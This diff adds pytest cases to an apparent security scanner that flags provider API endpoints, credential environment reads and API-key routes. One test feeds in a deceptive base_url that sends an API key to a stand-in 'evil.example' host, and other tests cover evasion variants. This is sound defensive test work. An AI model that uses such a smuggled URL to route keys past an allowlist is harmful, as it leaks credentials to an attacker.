@@ -213,6 +213,42 @@ def test_host_parser_uses_authority_only_or_fails_closed(url: str, expected: str
 
 
 @pytest.mark.parametrize(
+    "line",
+    [
+        "SCAN_REVIEW_BASE=${SCAN_REVIEW_BASE:-https://api.openai.com}",
+        "export SCAN_REVIEW_BASE=${SCAN_REVIEW_BASE:-https://api.anthropic.com}/v1",
+        "provider: {base_url: https://api.openai.com}",
+        "base_urls: [https://api.openai.com]",
+    ],
+)
+def test_language_delimiters_after_a_provider_url_cannot_hide_it(line: str) -> None:
+    assert "provider-api-endpoint" in _text_classes(line)
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        'v = os.getenv(key="OPENAI_API_KEY")',
+        'v = os.environ.get(key="OPENAI_API_KEY")',
+        'os.environ.setdefault(key="OPENAI_API_KEY", default="x")',
+    ],
+)
+def test_keyword_credential_reads_keep_their_classification(line: str) -> None:
+    assert "credential-env-read" in _text_classes(line)
+    findings, _allowed, parsed = _node_findings_for_postimage("app.py", f"{line}\n", {1})
+    assert parsed
+    assert "credential-env-read" in [item.kind for item in findings]
+
+
+def test_a_delimited_proxy_host_receives_no_exemption() -> None:
+    source = 'OpenAI(api_key=key, base_url="https://localhost}.evil.example/v1")\n'
+    findings, allowed, parsed = _node_findings_for_postimage("app.py", source, {1})
+    assert parsed
+    assert [(item.kind, item.line) for item in findings] == [("api-key-route", 1)]
+    assert allowed == []
+
+
+@pytest.mark.parametrize(
     "url",
     ["https://api.openai.com?next=@localhost", "https://api.openai.com/#@127.0.0.1"],
 )
@@ -251,6 +287,10 @@ def test_marker_outside_fixture_is_a_finding_with_next_action() -> None:
         ('os.environ.get("OPENAI_API_KEY")', True),
         ('os.environ.setdefault("OPENAI_API_KEY", value)', True),
         ('os.getenv("OPENAI_API_KEY")', True),
+        ('os.getenv(key="OPENAI_API_KEY")', True),
+        ('os.environ.get(key="OPENAI_API_KEY")', True),
+        ('os.environ.setdefault(key="OPENAI_API_KEY", default=value)', True),
+        ('os.getenv(key="PATH")', False),
         ('environ["OPENAI_API_KEY"]', True),
         ("os.getenv(name)", False),
         ('os.getenv("PATH")', False),
